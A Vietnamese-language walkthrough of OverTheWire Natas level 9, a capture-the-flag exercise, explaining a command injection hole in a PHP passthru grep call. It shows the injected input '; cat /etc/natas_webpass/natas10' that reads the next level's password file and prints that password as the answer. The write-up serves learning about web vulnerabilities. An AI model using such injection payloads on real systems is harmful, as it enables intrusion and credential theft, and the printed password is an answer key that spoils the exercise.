# Natas Level 8 → Level 9

Username: natas9

URL:http://natas9.natas.labs.overthewire.org

# Solution

Truy cập URL: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image45.png?raw=true)

Click View sourcecode: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image46.png?raw=true)

Nhìn vào code, có thể thấy đoạn PHP xử lý input có vấn đề bảo mật: ***passthru("grep -i $key dictionary.txt")*** thực thi trực tiếp lệnh shell mà không có bất kỳ biện pháp kiểm tra nào. Điều này dẫn đến Command Injection.

Cụ thể lệnh này sẽ search từ khóa nhập vào trong dictionary.txt, nhưng nếu nhập ***; cat /etc/natas_webpass/natas10*** thì lệnh có thể sẽ trở thành ***grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt***.

Nhập ***; cat /etc/natas_webpass/natas10*** và click search: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image47.png?raw=true)

=> Password natas10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu